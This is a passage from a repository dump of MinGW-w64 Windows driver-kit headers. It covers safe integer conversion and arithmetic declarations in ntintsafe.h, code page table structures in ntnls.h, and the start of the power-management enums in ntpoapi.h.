__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToUShort, LONG, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToWord, LONG, WORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToShort, LONG, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToUInt, LONG, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToULong, LONG, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToDWord, LONG, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToInt, LONG, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToUIntPtr, LONG, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToSizeT, LONG, size_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToULongPtr, LONG, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToDWordPtr, LONG, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToIntPtr, LONG, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToPtrdiffT, LONG, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongToULongLong, LONG, ULONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(LongToChar, LONG, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(IntToUChar, INT, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToUInt8, INT, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToByte, INT, BYTE)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToInt8, INT, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToUShort, INT, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToWord, INT, WORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToShort, INT, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToUInt, INT, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToULong, INT, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToDWord, INT, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToUIntPtr, INT, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToSizeT, INT, size_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToULongPtr, INT, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToDWordPtr, INT, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntToULongLong, INT, ULONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(IntToChar, INT, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(UIntPtrToUChar, UINT_PTR, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToUInt8, UINT_PTR, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToInt8, UINT_PTR, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToUInt16, UINT_PTR, UINT16)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToUShort, UINT_PTR, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToInt16, UINT_PTR, INT16)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToShort, UINT_PTR, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToUInt, UINT_PTR, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToULong, UINT_PTR, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToDWord, UINT_PTR, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToLong, UINT_PTR, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToInt, UINT_PTR, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToIntPtr, UINT_PTR, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToLongPtr, UINT_PTR, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToSSIZET, UINT_PTR, SSIZE_T)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToInt64, UINT_PTR, INT64)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(UIntPtrToLongLong, UINT_PTR, LONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(UIntPtrToChar, UINT_PTR, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToUInt, size_t, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToULong, size_t, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToDWord, size_t, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToLong, size_t, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToInt, size_t, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToIntPtr, size_t, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToPtrdiffT, size_t, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToLongPtr, size_t, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToSSIZET, size_t, SSIZE_T)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SizeTToInt64, size_t, INT64)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(ULongPtrToUChar, ULONG_PTR, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToUInt8, ULONG_PTR, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToInt8, ULONG_PTR, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToUShort, ULONG_PTR, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToShort, ULONG_PTR, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToUInt, ULONG_PTR, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToULong, ULONG_PTR, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToDWord, ULONG_PTR, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToLong, ULONG_PTR, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToInt, ULONG_PTR, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToUIntPtr, ULONG_PTR, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToIntPtr, ULONG_PTR, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToPtrdiffT, ULONG_PTR, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToLongPtr, ULONG_PTR, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToSSIZET, ULONG_PTR, SSIZE_T)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToInt64, ULONG_PTR, INT64)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongPtrToLongLong, ULONG_PTR, LONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(ULongPtrToChar, ULONG_PTR, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToUInt, DWORD_PTR, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToULong, DWORD_PTR, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToDWord, DWORD_PTR, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToLong, DWORD_PTR, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToInt, DWORD_PTR, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToUIntPtr, DWORD_PTR, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToIntPtr, DWORD_PTR, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToPtrdiffT, DWORD_PTR, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToLongPtr, DWORD_PTR, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToSSIZET, DWORD_PTR, SSIZE_T)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(DWordPtrToInt64, DWORD_PTR, INT64)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(IntPtrToUChar, INT_PTR, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToUInt8, INT_PTR, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToInt8, INT_PTR, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToUShort, INT_PTR, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToShort, INT_PTR, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToUInt, INT_PTR, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToULong, INT_PTR, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToDWord, INT_PTR, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToLong, INT_PTR, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToInt, INT_PTR, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToUIntPtr, INT_PTR, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToSizeT, INT_PTR, size_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToULongPtr, INT_PTR, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToDWordPtr, INT_PTR, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToLongPtr, INT_PTR, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(IntPtrToULongLong, INT_PTR, ULONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(IntPtrToChar, INT_PTR, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToUInt, ptrdiff_t, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToULong, ptrdiff_t, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToDWord, ptrdiff_t, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToLong, ptrdiff_t, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToInt, ptrdiff_t, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToUIntPtr, ptrdiff_t, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToSizeT, ptrdiff_t, size_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToULongPtr, ptrdiff_t, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(PtrdiffTToDWordPtr, ptrdiff_t, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(LongPtrToUChar, LONG_PTR, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToUInt8, LONG_PTR, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToInt8, LONG_PTR, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToUShort, LONG_PTR, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToShort, LONG_PTR, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToUInt, LONG_PTR, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToULong, LONG_PTR, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToDWord, LONG_PTR, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToLong, LONG_PTR, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToInt, LONG_PTR, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToUIntPtr, LONG_PTR, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToSizeT, LONG_PTR, size_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToULongPtr, LONG_PTR, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToDWordPtr, LONG_PTR, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToIntPtr, LONG_PTR, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongPtrToULongLong, LONG_PTR, ULONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(LongPtrToChar, LONG_PTR, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToUInt, SSIZE_T, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToULong, SSIZE_T, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToDWord, SSIZE_T, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToLong, SSIZE_T, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToInt, SSIZE_T, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToUIntPtr, SSIZE_T, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToSizeT, SSIZE_T, size_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToULongPtr, SSIZE_T, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToDWordPtr, SSIZE_T, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(SSIZETToIntPtr, SSIZE_T, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(ULongLongToUChar, ULONGLONG, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToUInt8, ULONGLONG, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToInt8, ULONGLONG, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToUShort, ULONGLONG, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToShort, ULONGLONG, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToUInt, ULONGLONG, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToULong, ULONGLONG, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToDWord, ULONGLONG, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToLong, ULONGLONG, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToInt, ULONGLONG, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToUIntPtr, ULONGLONG, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToSizeT, ULONGLONG, size_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToULongPtr, ULONGLONG, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToDWordPtr, ULONGLONG, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToIntPtr, ULONGLONG, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToPtrdiffT, ULONGLONG, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToLongPtr, ULONGLONG, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToSSIZET, ULONGLONG, SSIZE_T)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToInt64, ULONGLONG, INT64)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(ULongLongToLongLong, ULONGLONG, LONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(ULongLongToChar, ULONGLONG, CHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToUInt, INT64, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToULong, INT64, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToDWord, INT64, DWORD)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToLong, INT64, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToInt, INT64, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToUIntPtr, INT64, UINT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToSizeT, INT64, size_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToULongPtr, INT64, ULONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToDWordPtr, INT64, DWORD_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToIntPtr, INT64, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToPtrdiffT, INT64, ptrdiff_t)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToLongPtr, INT64, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToSSIZET, INT64, SSIZE_T)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(Int64ToULongLong, INT64, ULONGLONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV_UCHAR(LongLongToUChar, LONGLONG, UCHAR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToUInt8, LONGLONG, UINT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToInt8, LONGLONG, INT8)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToUShort, LONGLONG, USHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToShort, LONGLONG, SHORT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToUInt, LONGLONG, UINT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToULong, LONGLONG, ULONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToLong, LONGLONG, LONG)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToInt, LONGLONG, INT)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToIntPtr, LONGLONG, INT_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToLongPtr, LONGLONG, LONG_PTR)
__MINGW_INTSAFE_API __MINGW_INTSAFE_CONV(LongLongToULongLong, LONGLONG, ULONGLONG)
__MINGW_INTSAFE_CHAR_API __MINGW_INTSAFE_CONV_CHAR(LongLongToChar, LONGLONG, CHAR)

__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UInt8Add, UINT8, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(Int8Add, INT8, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UShortAdd, USHORT, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(WordAdd, WORD, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ShortAdd, SHORT, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UIntAdd, UINT, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongAdd, ULONG, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(DWordAdd, DWORD, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongAdd, LONG, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(IntAdd, INT, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UIntPtrAdd, UINT_PTR, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(SizeTAdd, size_t, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongPtrAdd, ULONG_PTR, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(DWordPtrAdd, DWORD_PTR, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(IntPtrAdd, INT_PTR, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(PtrdiffTAdd, ptrdiff_t, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongPtrAdd, LONG_PTR, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(SSIZETAdd, SSIZE_T, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongLongAdd, ULONGLONG, add)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongLongAdd, LONGLONG, add)

__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UInt8Sub, UINT8, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(Int8Sub, INT8, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UShortSub, USHORT, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(WordSub, WORD, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ShortSub, SHORT, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UIntSub, UINT, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongSub, ULONG, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(DWordSub, DWORD, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongSub, LONG, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(IntSub, INT, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UIntPtrSub, UINT_PTR, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(SizeTSub, size_t, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongPtrSub, ULONG_PTR, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(DWordPtrSub, DWORD_PTR, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(IntPtrSub, INT_PTR, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(PtrdiffTSub, ptrdiff_t, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongPtrSub, LONG_PTR, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(SSIZETSub, SSIZE_T, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongLongSub, ULONGLONG, sub)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongLongSub, LONGLONG, sub)

__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UInt8Mult, UINT8, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(Int8Mult, INT8, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UShortMult, USHORT, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(WordMult, WORD, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ShortMult, SHORT, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UIntMult, UINT, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongMult, ULONG, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(DWordMult, DWORD, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongMult, LONG, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(IntMult, INT, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(UIntPtrMult, UINT_PTR, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(SizeTMult, size_t, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongPtrMult, ULONG_PTR, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(DWordPtrMult, DWORD_PTR, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(IntPtrMult, INT_PTR, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(PtrdiffTMult, ptrdiff_t, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongPtrMult, LONG_PTR, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(SSIZETMult, SSIZE_T, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(ULongLongMult, ULONGLONG, mul)
__MINGW_INTSAFE_API __MINGW_INTSAFE_MATH(LongLongMult, LONGLONG, mul)

#endif /* __MINGW_INTSAFE_WORKS */
#endif /* WINAPI_FAMILY_PARTITION(WINAPI_PARTITION_APP) */
#endif /* _NTINTSAFE_H_INCLUDED_ */

```

`include/ddk/ntnls.h`:

```h

#ifndef _NTNLS_
#define _NTNLS_

#ifdef __cplusplus
extern "C" {
#endif

#define MAXIMUM_LEADBYTES 12

/* Some documentation can be found here: http://www.ping.uio.no/~ovehk/nls/ */
typedef struct _CPTABLEINFO
{
   USHORT  CodePage;
   USHORT  MaximumCharacterSize;       /* 1 = SBCS, 2 = DBCS */
   USHORT  DefaultChar;                /* Default MultiByte Character for the CP->Unicode conversion */
   USHORT  UniDefaultChar;             /* Default Unicode Character for the CP->Unicode conversion */
   USHORT  TransDefaultChar;           /* Default MultiByte Character for the Unicode->CP conversion */
   USHORT  TransUniDefaultChar;        /* Default Unicode Character for the Unicode->CP conversion */
   USHORT  DBCSCodePage;
   UCHAR LeadByte[MAXIMUM_LEADBYTES];
   PUSHORT MultiByteTable;             /* Table for CP->Unicode conversion */
   PVOID WideCharTable;                /* Table for Unicode->CP conversion */
   PUSHORT DBCSRanges;
   PUSHORT DBCSOffsets;
} CPTABLEINFO, *PCPTABLEINFO;

typedef struct _NLSTABLEINFO
{
   CPTABLEINFO OemTableInfo;
   CPTABLEINFO AnsiTableInfo;
   PUSHORT UpperCaseTable;
   PUSHORT LowerCaseTable;
} NLSTABLEINFO, *PNLSTABLEINFO;

#ifdef __cplusplus
}
#endif

#endif /* _NTNLS_ */


```

`include/ddk/ntpoapi.h`:

```h
/*
 * ntpoapi.h
 *
 * APIs for power management.
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __NTPOAPI_H
#define __NTPOAPI_H

#ifdef __cplusplus
extern "C" {
#endif

#ifndef _PO_DDK_
#define _PO_DDK_

/* Power States/Levels */
typedef enum _SYSTEM_POWER_STATE {
    PowerSystemUnspecified,
    PowerSystemWorking,
    PowerSystemSleeping1,
    PowerSystemSleeping2,
    PowerSystemSleeping3,
    PowerSystemHibernate,
    PowerSystemShutdown,
    PowerSystemMaximum
} SYSTEM_POWER_STATE, *PSYSTEM_POWER_STATE;
#define POWER_SYSTEM_MAXIMUM PowerSystemMaximum

typedef enum _DEVICE_POWER_STATE {
    PowerDeviceUnspecified,
    PowerDeviceD0,
    PowerDeviceD1,
    PowerDeviceD2,
    PowerDeviceD3,
    PowerDeviceMaximum
} DEVICE_POWER_STATE, *PDEVICE_POWER_STATE;

typedef union _POWER_STATE {
  SYSTEM_POWER_STATE  SystemState;
  DEVICE_POWER_STATE  DeviceState;
} POWER_STATE, *PPOWER_STATE;

typedef enum _POWER_STATE_TYPE {
  SystemPowerState = 0,
  DevicePowerState
